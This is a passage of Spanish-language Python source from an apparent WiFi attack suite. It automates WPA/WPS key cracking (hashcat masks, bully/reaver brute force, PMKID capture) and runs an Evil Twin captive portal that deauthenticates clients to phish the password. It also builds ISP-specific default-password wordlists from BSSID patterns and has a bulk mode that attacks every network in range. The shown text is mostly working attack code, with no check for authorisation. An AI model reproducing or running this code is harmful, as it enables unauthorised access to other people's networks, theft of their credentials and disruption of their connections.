            run(f"hashcat -m 22000 {_hf} -a 3 '{mask}' --force --quiet 2>/dev/null",
                capture=True)
            pot = run(f"hashcat --show -m 22000 {_hf} 2>/dev/null", capture=True) or ""
            pm = re.search(r':([^:\n]+)$', pot, re.MULTILINE)
            if pm:
                clave = pm.group(1).strip()
                metodo = f"Mascara hashcat ({mask_name})"
                eng.done(clave, metodo); return clave, metodo
    eng.update_phase(100)

    # ── FASE 7: WPS Brute Force completo con bully ─────────────────────────────
    eng.set_phase(7, 0)
    if has_wps and check_tool("bully"):
        eng.update_phase(10)
        bully_out = run(
            f"timeout 120 bully {iface} -b {bssid} -c {channel} "
            f"-S -F -B -v 3 2>/dev/null",
            capture=True
        ) or ""
        km = re.search(r'WPA PSK[:\s=]+["\']?([^\s"\']{8,})', bully_out, re.I)
        if km:
            clave = km.group(1); metodo = "WPS Brute Force (bully)"
            eng.done(clave, metodo); return clave, metodo
        eng.update_phase(80)
        # Fallback: reaver brute full si bully no lo logra
        if check_tool("reaver"):
            rvr_out = run(
                f"timeout 120 reaver -i {iface} -b {bssid} -c {channel} "
                f"-N -S -vv 2>/dev/null",
                capture=True
            ) or ""
            km = re.search(r'WPA PSK[:\s]+["\']?([^\s"\']{8,})', rvr_out, re.I)
            if km:
                clave = km.group(1); metodo = "WPS Brute Force (reaver)"
                eng.done(clave, metodo); return clave, metodo
    eng.update_phase(100)

    # ── FASE 8: PMKID retry extendido (90s) ───────────────────────────────────
    eng.set_phase(8, 0)
    if check_tool("hcxdumptool") and ("WPA2" in priv or "WPA3" in priv):
        pcap2 = f"exploit-engine/pmkid2_{essid_s}.pcapng"
        hc222 = f"exploit-engine/pmkid2_{essid_s}.hc22000"
        run(f"rm -f {pcap2} {hc222} 2>/dev/null")
        eng.update_phase(5)
        cap2 = subprocess.Popen(
            f"hcxdumptool -i {iface} -o {pcap2} "
            f"--filterlist_ap={bssid} --filtermode=2 "
            f"--active_beacon --enable_status=3 2>/dev/null",
            shell=True,
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        for tick in range(90):
            eng.update_phase(5 + int(tick / 90 * 80))
            time.sleep(1)
        cap2.terminate(); cap2.wait()
        eng.update_phase(88)
        if os.path.exists(pcap2) and check_tool("hcxpcapngtool"):
            run(f"hcxpcapngtool -o {hc222} {pcap2} 2>/dev/null", capture=True)
        if os.path.exists(hc222) and os.path.getsize(hc222) > 0 and check_tool("hashcat"):
            ssid_wl2 = f"exploit-engine/ssid_{essid_s}.txt"
            _gen_ssid_wordlist(essid, ssid_wl2, bssid)
            for wl in [ssid_wl2, wordlist]:
                if not wl or not os.path.exists(wl): continue
                run(f"hashcat -m 22000 {hc222} {wl} --force --quiet 2>/dev/null",
                    capture=True)
                pot = run(f"hashcat --show -m 22000 {hc222} 2>/dev/null",
                          capture=True) or ""
                pm = re.search(r':([^:\n]+)$', pot, re.MULTILINE)
                if pm:
                    clave = pm.group(1).strip(); metodo = "PMKID retry + hashcat"
                    eng.done(clave, metodo); return clave, metodo
    eng.update_phase(100)

    # ── FASE 9: Evil Twin + portal cautivo (último recurso) ───────────────────
    eng.set_phase(9, 0)
    if check_tool("hostapd") and check_tool("dnsmasq"):
        eng.update_phase(5)
        # Detener display para que el portal pueda usar el terminal limpiamente
        eng.stop()
        print()
        separador("FASE 9 — EVIL TWIN (último recurso)")
        warn("Ningún vector técnico funcionó. Lanzando Evil Twin automático.")
        warn("Se expulsarán clientes del router real. Esperando que la víctima ingrese la clave.")
        warn("Presione CTRL+C para cancelar y terminar.")
        print()
        try:
            captured = _evil_twin_run(
                essid, bssid, channel, iface,
                timeout_s=300   # 5 minutos esperando
            )
        except KeyboardInterrupt:
            captured = None
        if captured:
            eng.result = captured
            eng.method = "Evil Twin — portal cautivo"
            _live_results_append(essid, bssid, captured, "Evil Twin — portal cautivo")
            return captured, "Evil Twin — portal cautivo"

    eng.done(None, "sin_resultado")
    return None, "sin_resultado"


def _gen_ssid_wordlist(essid: str, output_path: str, bssid: str = ""):
    """Genera wordlist basada en el SSID + patrones comunes + variaciones por ISP."""
    words = set()
    base  = re.sub(r'[^a-zA-Z0-9]', '', essid).lower()
    nums  = re.findall(r'\d+', essid)          # números del SSID
    bssid_clean = bssid.replace(":", "").replace("-", "").lower()

    words.update([essid, essid.lower(), essid.upper(), base, base.capitalize()])

    # Sufijos numéricos universales
    for n in list(range(0,10)) + [12,123,1234,12345,123456,2023,2024,2025,2026]:
        words.update([f"{base}{n}", f"{essid}{n}", f"{base.capitalize()}{n}"])
    for suffix in ["wifi","wlan","home","casa","red","net","pass","key",
                   "admin","user","1234","0000","password","clave","internet"]:
        words.update([f"{base}{suffix}", f"{suffix}{base}",
                      f"{base.capitalize()}{suffix.capitalize()}"])

    essid_up = essid.upper()

    # ── TP-Link ──────────────────────────────────────────────────────────────
    if "TP-LINK" in essid_up or "TPLINK" in essid_up:
        for n in nums:
            words.update([n, f"tplink{n}", f"tp-link{n}", f"admin{n}",
                          f"password{n}", f"tp{n}link"])
        words.update(["admin1234","tplinkadmin","tplink123","12345678",
                      "tplink1234","password","administrator"])

    # ── ANTEL (ISP Uruguay) ──────────────────────────────────────────────────
    if "ANTEL" in essid_up:
        # Patrón ANTEL: últimos 4 y 6 hex del BSSID como contraseña por defecto
        if bssid_clean:
            last4 = bssid_clean[-4:]; last6 = bssid_clean[-6:]; last8 = bssid_clean[-8:]
            words.update([last4, last6, last8,
                          f"antel{last4}", f"antel{last6}",
                          bssid_clean[-4:].upper(), bssid_clean[-6:].upper()])
        for n in nums:
            words.update([f"antel{n}", f"ANTEL{n}", n])
        words.update(["antel1234","antel123","antel12345","anteladmin",
                      "internet1","internet123","antel2024","antel2025"])

    # ── Frog / wififrog (reseller ANTEL Uruguay) ──────────────────────────────
    if "FROG" in essid_up or "WIFIFROG" in essid_up:
        if bssid_clean:
            last4 = bssid_clean[-4:]; last6 = bssid_clean[-6:]
            words.update([last4, last6, f"frog{last4}", f"frog{last6}",
                          f"wifi{last4}", f"wififrog{last4}"])
        for n in nums:
            words.update([f"frog{n}", f"wififrog{n}", f"wifi{n}", n])
        words.update(["frogadmin","frog1234","frog12345","wififrog123",
                      "frog2024","frog2025","internet1","frogwifi"])

    # ── Claro / Movistar / Tigo ───────────────────────────────────────────────
    for isp in [("CLARO","claro"), ("MOVISTAR","movistar"), ("TIGO","tigo"),
                ("PERSONAL","personal"), ("FLOW","flow")]:
        if isp[0] in essid_up:
            for n in nums:
                words.update([f"{isp[1]}{n}", f"{isp[1]}wifi{n}"])
            words.update([f"{isp[1]}1234", f"{isp[1]}admin",
                          f"{isp[1]}12345", f"{isp[1]}internet"])

    # Números del SSID solos (contraseña = números del nombre de la red)
    for n in nums:
        words.add(n)

    with open(output_path, "w") as wf:
        for w in sorted(words):
            if len(w) >= 8:
                wf.write(w + "\n")


def exploit_engine():
    """[35] Exploit Engine — explotación automática con progreso en tiempo real."""
    os.system("clear")
    banner()
    separador("EXPLOIT ENGINE — EXPLOTACIÓN CON PROGRESO EN TIEMPO REAL")
    print(f"""
  {WHITE}¿Qué hace?{END}
  {DIM}Seleccionas una red y el motor ejecuta TODOS los vectores de
  ataque disponibles en orden de efectividad, mostrando un porcentaje
  de progreso en tiempo real. Si encuentra la clave, se detiene.

  Fases de ataque:
  {GREEN}[1]{END} Fingerprint + detección CVE    {DIM}(Kr00k, WPS, chipset){END}
  {GREEN}[2]{END} WPS Pixie Dust                 {DIM}(clave en segundos si es vulnerable){END}
  {GREEN}[3]{END} WPS Smart PIN (top-30 PINs)    {DIM}(brute inteligente){END}
  {GREEN}[4]{END} PMKID + hashcat multi-regla    {DIM}(sin clientes conectados){END}
  {GREEN}[5]{END} Handshake + deauth agresivo    {DIM}(3 rondas de 10/30/50 deauths){END}
  {GREEN}[6]{END} Cracking: SSID wl + rules + aircrack {DIM}(todas las herramientas){END}
    """)

    interfaz = select_interface()
    wordlist  = select_wordlist() or "/usr/share/wordlists/rockyou.txt"

    # Escanear y seleccionar objetivo
    step(1, "Escaneando redes objetivo...")
    bssid, channel, essid = select_target_from_scan(interfaz)
    if not bssid:
        error("Sin objetivo seleccionado.")
        pause_back(); return

    separador(f"OBJETIVO: {essid}")
    info(f"BSSID: {bssid}  Canal: {channel}")
    print()

    eng = ExploitEngine(essid, bssid, channel, interfaz, wordlist)

    step(2, "Iniciando Exploit Engine...")
    print()
    clave, metodo = smart_exploit_target(eng)
    print()

    # ── Resultado ─────────────────────────────────────────────────────────────
    separador("RESULTADO")
    if clave:
        ok(f"CLAVE ENCONTRADA: {GREEN}{clave}{END}")
        ok(f"Método:           {WHITE}{metodo}{END}")
        aid = db_log_attack("Exploit Engine", essid, bssid, channel,
                            f"crackeada:{clave}")
        db_log_password(aid, essid, bssid, clave, metodo)
        print(f"\n  {WHITE}Credenciales guardadas en el historial.{END}")
    else:
        warn("No se encontró la clave con los vectores disponibles.")
        tip("Pruebe con un diccionario más completo o verifique que el objetivo tiene WPS/WPA activo.")

    separador()
    gen = ask("¿Generar reporte HTML? (s/n)")
    if gen.lower() == "s":
        generate_report()
    else:
        pause_back()


def exploit_engine_bulk():
    """
    Variante batch del Exploit Engine: escanea varias redes y las ataca
    en orden de puntuación, mostrando progreso individual y total.
    """
    os.system("clear")
    banner()
    separador("EXPLOIT ENGINE — MODO MASIVO")

    interfaz = select_interface()
    wordlist  = select_wordlist() or "/usr/share/wordlists/rockyou.txt"

    t = ask("Tiempo de escaneo inicial (recomendado: 20s)")
    try: t = max(10, min(int(t), 60))
    except ValueError: t = 20

    step(1, "Escaneando y puntuando redes...")
    redes = quick_scan(interfaz, t)
    if not redes:
        error("Sin redes. ¿Modo monitor activo?")
        pause_back(); return

    wps_raw = ""
    if check_tool("wash"):
        sp = Spinner("Verificando WPS...")
        sp.start()
        try:
            wps_raw = subprocess.run(f"timeout 12 wash -i {interfaz} 2>/dev/null",
                                     shell=True, capture_output=True, text=True).stdout
        except Exception: pass
        sp.stop()

    scored = sorted([
        (_score_network(r, [wps_raw]) + (r,))
        for r in redes
    ], key=lambda x: x[0], reverse=True)

    separador("REDES DISPONIBLES")
    print(f"  {WHITE}{'#':<4} {'ESSID':<26} {'TIPO':<14} {'SCORE'}{END}")
    separador()
    for i, (sc, vv, r) in enumerate(scored, 1):
        col = RED if sc >= 80 else YELLOW if sc >= 50 else GREEN
        print(f"  {WHITE}[{i:>2}]{END} {CYAN}{r['essid'][:24]:<26}{END} "
              f"{YELLOW}{r['privacy'][:12]:<14}{END} {col}{sc}{END}")
    separador()

    sel = ask("¿Atacar cuáles? (ej: 1,2 / top3 / all)")
    targets = []
    if sel.lower() == "all": targets = scored
    elif sel.lower().startswith("top"):
        n = int(sel[3:]) if sel[3:].isdigit() else 3
        targets = scored[:n]
    else:
        for p in sel.split(","):
            p = p.strip()
            if p.isdigit() and 1 <= int(p) <= len(scored):
                targets.append(scored[int(p)-1])

    if not targets:
        error("Sin objetivos."); pause_back(); return

    resultados = []
    total = len(targets)
    for idx, (sc, vv, red) in enumerate(targets, 1):
        separador(f"[{idx}/{total}] {red['essid']}")
        info(f"Puntuación: {sc}  Vectores: {', '.join(vv)}")
        print()
        eng = ExploitEngine(red['essid'], red['bssid'], red['channel'],
                            interfaz, wordlist)
        clave, metodo = smart_exploit_target(eng)
        print()
        if clave:
            ok(f"{red['essid']} → {GREEN}{clave}{END}  [{metodo}]")
            aid = db_log_attack("Exploit Engine Bulk", red['essid'],
                                red['bssid'], red['channel'], f"crackeada:{clave}")
            db_log_password(aid, red['essid'], red['bssid'], clave, metodo)
        else:
            warn(f"{red['essid']} → sin resultado")
        resultados.append((red['essid'], clave, metodo))

    separador("RESUMEN FINAL")
    print(f"  {WHITE}{'ESSID':<28} {'CLAVE':<22} {'MÉTODO'}{END}")
    separador()
    for e, c, m in resultados:
        if c:
            print(f"  {CYAN}{e[:26]:<28}{END} {GREEN}{c[:20]:<22}{END} {WHITE}{m}{END}")
        else:
            print(f"  {CYAN}{e[:26]:<28}{END} {YELLOW}{'---':<22}{END} {DIM}{m}{END}")

    gen = ask("¿Generar reporte HTML? (s/n)")
    if gen.lower() == "s":
        generate_report()
    else:
        pause_back()

# ─────────────────────────────────────────────────────────────────────────────
# Menú principal
# ─────────────────────────────────────────────────────────────────────────────

# ═════════════════════════════════════════════════════════════════════════════
#  MÓDULO 37 — SETUP DE ADAPTADORES WiFi
#  Detecta el adaptador USB, identifica chipset, instala driver y verifica
#  compatibilidad con modo monitor.
# ═════════════════════════════════════════════════════════════════════════════

# Base de datos de adaptadores WiFi USB conocidos
# Formato: "idVendor:idProduct" -> (nombre_comercial, chipset, driver_modulo, repo_dkms, apt_pkg)
_ADAPTERS_DB = {
    # ── TP-Link ────────────────────────────────────────────────────────────────
    "0cf3:9271": ("TP-Link TL-WN722N v1",        "Atheros AR9271",    "ath9k_htc",  None,                                          "firmware-atheros"),
    "2357:010c": ("TP-Link TL-WN722N v2/v3",     "Realtek RTL8188EUS","8188eu",     "https://github.com/aircrack-ng/rtl8188eus",   "realtek-rtl88xxau-dkms"),
    "2357:0108": ("TP-Link TL-WN722N v2",        "Realtek RTL8188EUS","8188eu",     "https://github.com/aircrack-ng/rtl8188eus",   "realtek-rtl88xxau-dkms"),
    "2357:0101": ("TP-Link TL-WN821N",           "Realtek RTL8192CU", "rtl8192cu",  None,                                          None),
    "2357:0115": ("TP-Link Archer T2U",          "Realtek RTL8811AU", "rtl8812au",  "https://github.com/aircrack-ng/rtl8812au",    "realtek-rtl88xxau-dkms"),
    "2357:0120": ("TP-Link Archer T2U Plus",     "Realtek RTL8812AU", "rtl8812au",  "https://github.com/aircrack-ng/rtl8812au",    "realtek-rtl88xxau-dkms"),
    "2357:011e": ("TP-Link Archer T3U",          "Realtek RTL8812BU", "rtl88x2bu",  "https://github.com/morrownr/88x2bu",          None),
    "2357:0138": ("TP-Link Archer T3U Plus",     "Realtek RTL8812BU", "rtl88x2bu",  "https://github.com/morrownr/88x2bu",          None),
    "2357:012d": ("TP-Link TL-WN823N v2",        "Realtek RTL8192EU", "rtl8192eu",  None,                                          None),
    "2357:0107": ("TP-Link TL-WN725N v2",        "Realtek RTL8188EUS","8188eu",     "https://github.com/aircrack-ng/rtl8188eus",   None),
    # ── Alfa Networks ─────────────────────────────────────────────────────────
    "0bda:8812": ("Alfa AWUS036ACH",             "Realtek RTL8812AU", "rtl8812au",  "https://github.com/aircrack-ng/rtl8812au",    "realtek-rtl88xxau-dkms"),
    "0cf3:7015": ("Alfa AWUS036H",               "Atheros AR7010",    "ath9k_htc",  None,                                          "firmware-atheros"),
    "0bda:a811": ("Alfa AWUS036ACS",             "Realtek RTL8811AU", "rtl8812au",  "https://github.com/aircrack-ng/rtl8812au",    "realtek-rtl88xxau-dkms"),
    "0bda:881a": ("Alfa AWUS036ACM",             "Realtek RTL8812AU", "rtl8812au",  "https://github.com/aircrack-ng/rtl8812au",    "realtek-rtl88xxau-dkms"),
    # ── Realtek genéricos ──────────────────────────────────────────────────────
    "0bda:8179": ("Realtek RTL8188ETV",          "Realtek RTL8188ETV","rtl8188eu",  None,                                          None),
    "0bda:b812": ("Realtek RTL8812BU",           "Realtek RTL8812BU", "rtl88x2bu",  "https://github.com/morrownr/88x2bu",          None),
    "0bda:c811": ("Realtek RTL8811CU",           "Realtek RTL8811CU", "rtl8821cu",  "https://github.com/morrownr/8821cu",          None),
    "0bda:8176": ("Realtek RTL8188CUS",          "Realtek RTL8188CUS","rtl8192cu",  None,                                          None),
    "0bda:8187": ("Realtek RTL8187",             "Realtek RTL8187",   "rtl8187",    None,                                          None),
    # ── Ralink / MediaTek ──────────────────────────────────────────────────────
    "148f:5572": ("Panda PAU09 / Ralink RT5572", "Ralink RT5572",     "rt2800usb",  None,                                          None),
    "148f:7601": ("MediaTek MT7601U",            "MediaTek MT7601U",  "mt7601u",    None,                                          None),
    "148f:3070": ("Ralink RT3070",               "Ralink RT3070",     "rt2800usb",  None,                                          None),
    "148f:5370": ("Ralink RT5370",               "Ralink RT5370",     "rt2800usb",  None,                                          None),
    # ── D-Link / ASUS / otros ─────────────────────────────────────────────────
    "2001:3319": ("D-Link DWA-131",              "Realtek RTL8192EU", "rtl8192eu",  None,                                          None),
    "2001:3c1e": ("D-Link DWA-171",              "Realtek RTL8821AU", "rtl8812au",  "https://github.com/aircrack-ng/rtl8812au",    "realtek-rtl88xxau-dkms"),
    "0b05:17d1": ("ASUS USB-N13",               "Ralink RT3072",     "rt2800usb",  None,                                          None),
    "0b05:184c": ("ASUS USB-AC56",              "Realtek RTL8812AU", "rtl8812au",  "https://github.com/aircrack-ng/rtl8812au",    "realtek-rtl88xxau-dkms"),
}

# Notas específicas por chipset
_CHIPSET_NOTES = {
    "Realtek RTL8188EUS": (
        "El TL-WN722N v2/v3 necesita el driver rtl8188eus.\n"
        "  Modo monitor: la interfaz NO cambia de nombre (queda como wlan0).\n"
        "  Comando monitor: ip link set wlan0 down && iw wlan0 set monitor none && ip link set wlan0 up"
    ),
    "Realtek RTL8812AU": (
        "Driver rtl8812au compatible con Kali. Soporta 2.4GHz y 5GHz.\n"
        "  Modo monitor: airmon-ng start wlan0 o método manual con iw."
    ),
    "Realtek RTL8812BU": (
        "Driver rtl88x2bu. Requiere compilación con DKMS.\n"
        "  Modo monitor: usar método manual (ip link + iw)."
    ),
    "Atheros AR9271": (
        "Chipset nativo en Linux. Monitor mode funciona directamente.\n"
        "  airmon-ng start wlan0 crea wlan0mon."
    ),
}

def _detect_usb_wifi() -> list:
    """Detecta adaptadores WiFi USB conectados via lsusb."""
    lsusb_out = run("lsusb 2>/dev/null", capture=True) or ""
    found = []
    for line in lsusb_out.splitlines():
        # Formato: Bus 001 Device 002: ID 0cf3:9271 Qualcomm Atheros Communications AR9271...
        m = re.search(r'ID\s+([0-9a-f]{4}:[0-9a-f]{4})\s+(.*)', line, re.I)
        if not m: continue
        uid, desc = m.group(1).lower(), m.group(2).strip()
        # Filtrar solo dispositivos WiFi/red (vendor IDs conocidos)
        vendor = uid.split(":")[0]
        if vendor in ("0cf3","2357","0bda","148f","2001","0b05","050d","07d1","0846","1737"):
            found.append((uid, desc))
        elif uid in _ADAPTERS_DB:
            found.append((uid, desc))
    return found


def _install_driver_menu(uid: str, entry: tuple):
    """Menú interactivo para instalar el driver de un adaptador."""
    nombre, chipset, driver, repo, apt_pkg = entry

    separador(f"INSTALAR DRIVER: {nombre}")
    print(f"  {WHITE}Chipset:{END} {CYAN}{chipset}{END}")
    print(f"  {WHITE}Driver: {END} {CYAN}{driver}{END}")

    if chipset in _CHIPSET_NOTES:
        print(f"\n  {YELLOW}[Nota]{END} {_CHIPSET_NOTES[chipset]}")

    print(f"\n  {WHITE}Métodos de instalación disponibles:{END}")
    opciones = []

    # Método 1: apt
    if apt_pkg:
        print(f"  {GREEN}[1]{END} APT (recomendado): {CYAN}sudo apt install {apt_pkg}{END}")
        opciones.append(("apt", apt_pkg))

    # Método 2: DKMS desde git
    if repo:
        repo_name = repo.rstrip("/").split("/")[-1]
        print(f"  {GREEN}[2]{END} DKMS desde GitHub: {CYAN}{repo}{END}")
        opciones.append(("dkms", repo, repo_name))

    # Método 3: driver ya instalado, solo probar
    print(f"  {GREEN}[3]{END} Solo verificar si el driver ya está cargado")
    print(f"  {GREEN}[0]{END} Cancelar")

    sel = ask("Seleccione método")

    if sel == "1" and ("apt", apt_pkg) in opciones[:1]:
        info(f"Instalando {apt_pkg} via APT...")
        run("apt-get update -qq 2>/dev/null")
        run(f"apt-get install -y {apt_pkg} 2>&1")
        run(f"modprobe {driver} 2>/dev/null")
        ok("Driver instalado. Reconecta el adaptador si es necesario.")

    elif sel == "2" and any(o[0] == "dkms" for o in opciones):
        dkms_entry = next(o for o in opciones if o[0] == "dkms")
        _, repo_url, repo_name = dkms_entry
        info(f"Clonando {repo_url}...")
        run(f"apt-get install -y dkms linux-headers-$(uname -r) 2>/dev/null")
        run(f"git clone {repo_url} /tmp/{repo_name} 2>&1")

        # Detectar método de instalación del repo
        if os.path.exists(f"/tmp/{repo_name}/Makefile"):
            run(f"cd /tmp/{repo_name} && make && make install 2>&1")
        elif os.path.exists(f"/tmp/{repo_name}/install.sh"):
            run(f"cd /tmp/{repo_name} && bash install.sh 2>&1")
        else:
            run(f"cd /tmp/{repo_name} && dkms add . 2>/dev/null && "
                f"dkms build {repo_name}/1.0 2>/dev/null && "
                f"dkms install {repo_name}/1.0 2>/dev/null")
        run(f"modprobe {driver} 2>/dev/null")
        ok("Driver instalado desde GitHub.")

    elif sel == "3":
        loaded = run(f"lsmod | grep {driver}", capture=True) or ""
        if loaded.strip():
            ok(f"Driver '{driver}' está cargado en el kernel.")
        else:
            warn(f"Driver '{driver}' NO está cargado.")
            info(f"Intentando: modprobe {driver}")
            run(f"modprobe {driver} 2>/dev/null")
            loaded2 = run(f"lsmod | grep {driver}", capture=True) or ""
            if loaded2.strip():
                ok("Driver cargado correctamente.")
            else:
                error("No se pudo cargar el driver. Instálalo primero.")


def setup_adapter():
    """[37] Configuración de adaptadores WiFi — detección y driver automático."""
    os.system("clear")
    banner()
    separador("SETUP DE ADAPTADORES WiFi")
    print(f"""
  {WHITE}Esta herramienta:{END}
  {DIM}• Detecta todos los adaptadores WiFi USB conectados
  • Identifica el chipset y el driver necesario
  • Instala el driver automáticamente (apt o DKMS)
  • Verifica compatibilidad con modo monitor
  • Compatible con TP-Link, Alfa, Panda, D-Link, ASUS y más{END}

  {WHITE}Adaptadores con soporte completo:{END}
  {GREEN}TP-Link:{END}   TL-WN722N v1/v2/v3, Archer T2U, T3U, TL-WN823N
  {GREEN}Alfa:   {END}   AWUS036ACH, AWUS036H, AWUS036ACS, AWUS036ACM
  {GREEN}Otros:  {END}   Panda PAU09, D-Link DWA-131/171, ASUS USB-N13
    """)

    # ── Detectar adaptadores USB ───────────────────────────────────────────────
    step(1, "Detectando adaptadores WiFi USB conectados")
    usb_devs = _detect_usb_wifi()

    if not usb_devs:
        warn("No se detectaron adaptadores WiFi USB.")
        tip("Asegúrate de que el adaptador esté conectado.")
        tip("Prueba: lsusb | grep -i wireless")
        pause_back(); return

    # Mostrar todos los encontrados
    separador("ADAPTADORES DETECTADOS")
    reconocidos = []
    no_reconocidos = []

    for uid, desc in usb_devs:
        if uid in _ADAPTERS_DB:
            entry = _ADAPTERS_DB[uid]
            reconocidos.append((uid, desc, entry))
            nombre, chipset, driver, _, _ = entry
            print(f"  {GREEN}[✔]{END} {WHITE}{uid}{END}  {CYAN}{nombre}{END}")
            print(f"       {DIM}Chipset: {chipset}  Driver: {driver}{END}")
        else:
            no_reconocidos.append((uid, desc))
            print(f"  {YELLOW}[?]{END} {WHITE}{uid}{END}  {DIM}{desc}{END}")

    if no_reconocidos:
        print(f"\n  {YELLOW}[!]{END} {len(no_reconocidos)} dispositivo(s) no reconocidos.")
        tip("Pueden ser hubs USB, cámaras, etc. Si es tu adaptador WiFi, abre un issue en GitHub.")

    if not reconocidos:
        warn("Ningún adaptador reconocido en la base de datos.")
        tip("Tu adaptador puede funcionar con drivers nativos de Linux.")
        tip("Prueba: sudo airmon-ng start wlan0")
        pause_back(); return

    # ── Si hay varios, seleccionar ─────────────────────────────────────────────
    if len(reconocidos) > 1:
        print()
        for i, (uid, desc, entry) in enumerate(reconocidos, 1):
            print(f"  {WHITE}[{i}]{END} {entry[0]}  {DIM}({uid}){END}")
        sel = ask("Seleccione adaptador a configurar")
        if sel.isdigit() and 1 <= int(sel) <= len(reconocidos):
            uid, desc, entry = reconocidos[int(sel)-1]
        else:
            uid, desc, entry = reconocidos[0]
    else:
        uid, desc, entry = reconocidos[0]

    nombre, chipset, driver, repo, apt_pkg = entry
    separador(f"CONFIGURANDO: {nombre}")

    # ── Verificar driver actual ────────────────────────────────────────────────
    step(2, "Verificando driver")
    loaded = run(f"lsmod | grep {driver} 2>/dev/null", capture=True) or ""
    if loaded.strip():
        ok(f"Driver '{driver}' ya está cargado en el kernel.")
        driver_ok = True
    else:
        warn(f"Driver '{driver}' no está cargado.")
        driver_ok = False

    # ── Verificar interfaz ─────────────────────────────────────────────────────
    step(3, "Verificando interfaz de red")
    ifaces = get_interfaces()
    if ifaces:
        ok(f"Interfaces detectadas: {', '.join(ifaces)}")
        iface = ifaces[0]
    else:
        warn("No se detectó ninguna interfaz WiFi activa.")
        iface = None

    # ── Instalar driver si falta ───────────────────────────────────────────────
    if not driver_ok or not iface:
        print()
        instalar = ask("¿Instalar/reparar driver automáticamente? (s/n)")
        if instalar.lower() == "s":
            _install_driver_menu(uid, entry)
            time.sleep(2)
            ifaces = get_interfaces()
            iface = ifaces[0] if ifaces else None

    # ── Probar modo monitor ────────────────────────────────────────────────────
    step(4, "Probando compatibilidad con modo monitor")
    if not iface:
        error("Sin interfaz WiFi disponible. Reconecta el adaptador.")
        pause_back(); return

    tip(f"Intentando activar modo monitor en: {iface}")
    sp = Spinner("Probando modo monitor...")
    sp.start()
    mon = _enable_monitor(iface)
    sp.stop()

    mode_chk = run(f"iw dev {mon} info 2>/dev/null | grep type", capture=True) or ""
    if "monitor" in mode_chk:
        ok(f"MODO MONITOR FUNCIONA en {CYAN}{mon}{END}")
        print(f"\n  {GREEN}{'─'*50}{END}")
        print(f"  {WHITE}Adaptador listo para usar con Herradura Hack.{END}")
        print(f"  {DIM}Interfaz monitor: {mon}{END}")
        print(f"  {DIM}Presiona [W] en el menú para empezar el ataque automático.{END}")
        print(f"  {GREEN}{'─'*50}{END}\n")

        # Restaurar a managed para no dejar en monitor
        desact = ask("¿Restaurar a modo normal ahora? (s/n) [recomendado]")
        if desact.lower() != "n":
            run(f"airmon-ng stop {mon} 2>/dev/null")
            run(f"ip link set {iface} down 2>/dev/null; "
                f"iw dev {iface} set type managed 2>/dev/null; "
                f"ip link set {iface} up 2>/dev/null")
            run("systemctl start NetworkManager 2>/dev/null")
            ok("Adaptador restaurado a modo normal.")
    else:
        error(f"Modo monitor NO funciona en {mon}.")
        print(f"\n  {YELLOW}Posibles causas:{END}")
        print(f"  {DIM}• Driver incorrecto o no compilado para este kernel{END}")
        print(f"  {DIM}• Adaptador TP-Link TL-WN722N v2/v3: necesita rtl8188eus{END}")
        print(f"  {DIM}• Intenta: sudo apt install realtek-rtl88xxau-dkms{END}")
        print(f"  {DIM}• O instala el driver con la opción [2] de este menú{END}")

        if chipset == "Realtek RTL8188EUS":
            print(f"\n  {WHITE}Para TL-WN722N v2/v3 (RTL8188EUS):{END}")
            print(f"  {CYAN}sudo apt install realtek-rtl88xxau-dkms{END}")
            print(f"  {CYAN}sudo rmmod r8188eu; sudo modprobe 8188eu{END}")
            print(f"  {CYAN}sudo iw dev wlan0 set monitor none{END}")

    pause_back()


def list_supported_adapters():
    """[38] Lista todos los adaptadores soportados con sus drivers."""
    os.system("clear")
    banner()
    separador("ADAPTADORES WiFi SOPORTADOS")
    print(f"  {DIM}Todos estos adaptadores son compatibles con modo monitor en Kali Linux{END}\n")

    # Agrupar por fabricante
    groups = {}
    for uid, (nombre, chipset, driver, repo, apt) in _ADAPTERS_DB.items():
        fab = nombre.split()[0]
        if fab not in groups: groups[fab] = []
        groups[fab].append((uid, nombre, chipset, driver))

    for fab, items in sorted(groups.items()):
        print(f"  {WHITE}── {fab} {'─'*(40-len(fab))}{END}")
        for uid, nombre, chipset, driver in items:
            # Verificar si está conectado ahora
            lsusb_check = run(f"lsusb | grep -i {uid}", capture=True) or ""
            connected = f" {GREEN}← CONECTADO{END}" if lsusb_check.strip() else ""
            print(f"    {CYAN}{uid}{END}  {nombre:<35} {DIM}{chipset}{END}{connected}")
        print()

    separador()
    tip("Conecta tu adaptador y usa [37] para instalar el driver automáticamente.")
    pause_back()


OPCIONES = {
    "w":  ("Modo Guiado (principiantes)",              modo_wizard),
    # ── Interfaz ──────────────────────────────────────────────────────────────
    1:    ("Iniciar modo monitor",                     start_monitor),
    2:    ("Detener modo monitor",                     stop_monitor),
    3:    ("Ver interfaces",                           show_interface),
    4:    ("Reiniciar red",                            restart_network),
    # ── Escaneo ──────────────────────────────────────────────────────────────
    5:    ("Escanear y guardar CSV",                   scan_networks),
    6:    ("Escaneo en vivo (tabla visual)",           scan_live),
    11:   ("Escanear redes WPS",                       scan_wps),
    16:   ("Vendor/OUI Lookup",                        vendor_lookup),
    22:   ("Probe Request Harvester",                  probe_harvester),
    # ── Ataques ───────────────────────────────────────────────────────────────
    7:    ("Capturar Handshake WPA/WPA2",              capture_handshake),
    8:    ("Descifrar clave",                          crack_password),
    9:    ("Ataque PMKID (sin clientes)",              pmkid_attack),
    10:   ("Ataque WPS (Bully/Reaver/Pixie)",          wps_attack),
    13:   ("Deautenticación",                          deauth_attack),
    15:   ("Evil Twin + Portal Cautivo",               evil_twin),
    17:   ("Auto-Crack (captura + crack auto)",        auto_crack),
    18:   ("Multi-Deauth desde CSV",                   multi_deauth),
    21:   ("KARMA/MANA Attack",                        karma_attack),
    23:   ("WPA Enterprise Attack",                    wpa_enterprise_attack),
    25:   ("WEP Full Attack",                          wep_full_attack),
    26:   ("Deauth Channel Hopping",                   deauth_channel_hopping),
    27:   ("Hidden SSID Revealer",                     hidden_ssid_revealer),
    # ── Post-Explotación ──────────────────────────────────────────────────────
    28:   ("Post-Explotación + Vulnerabilidades",      post_explotacion),
    # ── Automáticos / Nuevos ──────────────────────────────────────────────────
    31:   ("AUTO-PWNER (ataque automático total)",     auto_pwner),
    32:   ("Vulnerabilidades Modernas 2023-2025",      modern_vulns),
    33:   ("Auditoría Express (sin ataques)",          auditoria_express),
    34:   ("Suite CVE 2019-2024 (Kr00k/Frag/EAP...)", cve_suite),
    35:   ("Exploit Engine (auto-exploit con progreso %)", exploit_engine),
